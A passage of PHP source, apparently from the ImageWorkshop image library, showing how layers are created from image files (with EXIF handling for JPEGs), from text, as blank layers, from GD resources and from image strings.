            throw new ImageWorkshopException(sprintf('File "%s" not exists.', $path), static::ERROR_IMAGE_NOT_FOUND);
        }

        if (false === ($imageSizeInfos = @getImageSize($path))) {
            throw new ImageWorkshopException('Can\'t open the file at "'.$path.'" : file is not readable, did you check permissions (755 / 777) ?', static::ERROR_NOT_READABLE_FILE);
        }

        $mimeContentType = explode('/', $imageSizeInfos['mime']);
        if (!$mimeContentType || !isset($mimeContentType[1])) {
            throw new ImageWorkshopException('Not an image file (jpeg/png/gif) at "'.$path.'"', static::ERROR_NOT_AN_IMAGE_FILE);
        }

        $mimeContentType = $mimeContentType[1];
        $exif = array();

        switch ($mimeContentType) {
            case 'jpeg':
                $image = imageCreateFromJPEG($path);
                if (false === ($exif = @read_exif_data($path))) {
                    $exif = array();
                }
            break;

            case 'gif':
                $image = imageCreateFromGIF($path);
            break;

            case 'png':
                $image = imageCreateFromPNG($path);
            break;

            default:
                throw new ImageWorkshopException('Not an image file (jpeg/png/gif) at "'.$path.'"', static::ERROR_NOT_AN_IMAGE_FILE);
            break;
        }

        if (false === $image) {
            throw new ImageWorkshopException('Unable to create image with file found at "'.$path.'"');
        }

        $layer = new ImageWorkshopLayer($image, $exif);

        if ($fixOrientation) {
            $layer->fixOrientation();
        }

        return $layer;
    }
    
    /**
     * Initialize a text layer
     * 
     * @param string $text
     * @param string $fontPath
     * @param integer $fontSize
     * @param string $fontColor
     * @param integer $textRotation
     * @param integer $backgroundColor
     * 
     * @return ImageWorkshopLayer
     */
    public static function initTextLayer($text, $fontPath, $fontSize = 13, $fontColor = 'ffffff', $textRotation = 0, $backgroundColor = null)
    {
        $textDimensions = ImageWorkshopLib::getTextBoxDimension($fontSize, $textRotation, $fontPath, $text);

        $layer = static::initVirginLayer($textDimensions['width'], $textDimensions['height'], $backgroundColor);
        $layer->write($text, $fontPath, $fontSize, $fontColor, $textDimensions['left'], $textDimensions['top'], $textRotation);
        
        return $layer;
    }
    
    /**
     * Initialize a new virgin layer
     * 
     * @param integer $width
     * @param integer $height
     * @param string $backgroundColor
     * 
     * @return ImageWorkshopLayer
     */
    public static function initVirginLayer($width = 100, $height = 100, $backgroundColor = null)
    {
        $opacity = 0;
        
        if (null === $backgroundColor || $backgroundColor == 'transparent') {
            $opacity = 127;
            $backgroundColor = 'ffffff';
        }
        
        return new ImageWorkshopLayer(ImageWorkshopLib::generateImage($width, $height, $backgroundColor, $opacity));
    }
    
    /**
     * Initialize a layer from a resource image var
     * 
     * @param \resource $image
     * 
     * @return ImageWorkshopLayer
     */
    public static function initFromResourceVar($image)
    {
        return new ImageWorkshopLayer($image);
    }
    
    /**
     * Initialize a layer from a string (obtains with file_get_contents, cURL...)
     * 
     * This not recommanded to initialize JPEG string with this method, GD displays bugs !
     * 
     * @param string $imageString
     * 
     * @return ImageWorkshopLayer
     */
    public static function initFromString($imageString)
    {
        if (!$image = @imageCreateFromString($imageString)) {
            throw new ImageWorkshopException('Can\'t generate an image from the given string.', static::ERROR_CREATE_IMAGE_FROM_STRING);
        }
        
        return new ImageWorkshopLayer($image);
    }
}